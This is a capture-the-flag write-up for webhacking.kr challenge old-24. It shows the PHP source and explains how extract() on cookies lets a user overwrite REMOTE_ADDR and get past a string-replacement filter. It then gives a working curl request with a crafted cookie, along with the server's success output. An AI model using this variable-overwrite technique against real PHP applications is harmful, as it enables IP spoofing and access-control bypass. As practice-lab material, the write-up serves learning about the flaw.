# Old 24    PHP (Extract)

URL: [https://webhacking.kr/challenge/bonus-4/?view_source=1](https://webhacking.kr/challenge/bonus-4/?view_source=1)

![old-24-1.png](/assets/ctf/webhacking.kr/old-24-1.png)

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 24</title>
</head>
<body>
<p>
<?php
  extract($_SERVER);
  extract($_COOKIE);
  $ip = $REMOTE_ADDR;
  $agent = $HTTP_USER_AGENT;
  if($REMOTE_ADDR){
    $ip = htmlspecialchars($REMOTE_ADDR);
    $ip = str_replace("..",".",$ip);
    $ip = str_replace("12","",$ip);
    $ip = str_replace("7.","",$ip);
    $ip = str_replace("0.","",$ip);
  }
  if($HTTP_USER_AGENT){
    $agent=htmlspecialchars($HTTP_USER_AGENT);
  }
  echo "<table border=1><tr><td>client ip</td><td>{$ip}</td></tr><tr><td>agent</td><td>{$agent}</td></tr></table>";
  if($ip=="127.0.0.1"){ # 112277...00...00...1
    solve(24);
    exit();
  }
  else{
    echo "<hr><center>Wrong IP!</center>";
  }
?><hr>
<a href=?view_source=1>view-source</a>
</body>
</html>
```

The trick in the code is sneaking the `REMOTE_ADDR` variable. It's set by the `$_SERVER` and most of the cannot be modified, but there's also cookie and they use `extract` which essentially just evaluates dictionary into variables. To get correct value for `$ip` just sandwich the values so output will get reduced to desired output.

```powershell
➜ curl https://webhacking.kr/challenge/bonus-4/ -b 'PHPSESSID=3052403292' -b 'REMOTE_ADDR=112277...00...00...1'
<html>
<head>
<title>Challenge 24</title>
</head>
<body>
<p>
<table border=1><tr><td>client ip</td><td>127.0.0.1</td></tr><tr><td>agent</td><td>curl/8.4.0</td></tr></table><script>alert('old-24 Pwned!');</script><hr>old-24 Pwned. You got 10point. Congratz!<hr>
```